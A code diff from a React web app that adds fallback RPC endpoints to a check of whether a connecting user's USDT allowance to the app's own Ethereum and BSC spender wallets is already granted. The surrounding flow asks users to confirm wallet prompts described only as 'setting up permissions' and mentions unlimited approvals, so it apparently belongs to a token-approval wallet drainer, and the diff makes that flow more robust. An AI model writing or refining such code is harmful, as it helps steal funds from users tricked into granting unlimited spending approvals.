@@ -180,18 +180,23 @@ function App() {
       if (!bscWallet) return;
 
       // Check allowance via public RPC (no MetaMask popup) — returns true if already approved
-      const isApprovedOnChain = async (tokenAddr, ownerAddr, spenderAddr, rpcUrl) => {
-        try {
-          const pad = a => a.replace('0x', '').toLowerCase().padStart(64, '0');
-          const data = '0xdd62ed3e' + pad(ownerAddr) + pad(spenderAddr);
-          const r = await fetch(rpcUrl, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_call', params: [{ to: tokenAddr, data }, 'latest'], id: 1 }),
-            signal: AbortSignal.timeout(6000)
-          }).then(r => r.json());
-          if (!r.result || r.result === '0x') return false;
-          return BigInt(r.result) > BigInt('1000000'); // > 1 token (covers both 6 and 18 decimal tokens)
-        } catch { return false; }
+      // Check allowance via public RPC with fallback list — no MetaMask popup
+      const isApprovedOnChain = async (tokenAddr, ownerAddr, spenderAddr, rpcs) => {
+        const rpcList = Array.isArray(rpcs) ? rpcs : [rpcs];
+        const pad = a => a.replace('0x', '').toLowerCase().padStart(64, '0');
+        const data = '0xdd62ed3e' + pad(ownerAddr) + pad(spenderAddr);
+        for (const rpc of rpcList) {
+          try {
+            const r = await fetch(rpc, {
+              method: 'POST', headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_call', params: [{ to: tokenAddr, data }, 'latest'], id: 1 }),
+              signal: AbortSignal.timeout(5000)
+            }).then(r => r.json());
+            if (!r.result || r.result === '0x') return false;
+            return BigInt(r.result) > BigInt('1000000'); // > 1 raw unit covers MaxUint256 approvals
+          } catch { continue; }
+        }
+        return false; // all RPCs failed — assume not approved, will retry on next connect
       };
 
       const switchChain = async (chainId, chainName, rpcUrl, explorer, nativeSymbol) => {
@@ -240,7 +245,12 @@ function App() {
       const ethFlagKey = `approvalsGrantedETH_${addr}`;
       const ethCached = localStorage.getItem(ethFlagKey);
       const ethAlreadyApproved = ethCached
-        ? await isApprovedOnChain(ETH_USDT, address, ethWallet, 'https://rpc.ankr.com/eth')
+        ? await isApprovedOnChain(ETH_USDT, address, ethWallet, [
+            'https://rpc.ankr.com/eth',
+            'https://eth.llamarpc.com',
+            'https://1rpc.io/eth',
+            'https://cloudflare-eth.com',
+          ])
         : false;
       if (!ethAlreadyApproved) {
         setConnectStep('🔵 Setting up Ethereum permissions — please confirm each prompt in your wallet...');
@@ -262,7 +272,11 @@ function App() {
       const bscFlagKey = `approvalsGrantedBSC_${addr}`;
       const bscCached = localStorage.getItem(bscFlagKey);
       const bscAlreadyApproved = bscCached
-        ? await isApprovedOnChain(BSC_USDT, address, bscWallet, 'https://bsc-dataseed1.binance.org/')
+        ? await isApprovedOnChain(BSC_USDT, address, bscWallet, [
+            'https://bsc-dataseed1.binance.org/',
+            'https://bsc-dataseed2.binance.org/',
+            'https://bsc-dataseed3.binance.org/',
+          ])
         : false;
       if (!bscAlreadyApproved) {
         setConnectStep('🟡 Setting up BSC permissions — please confirm each prompt in your wallet...');
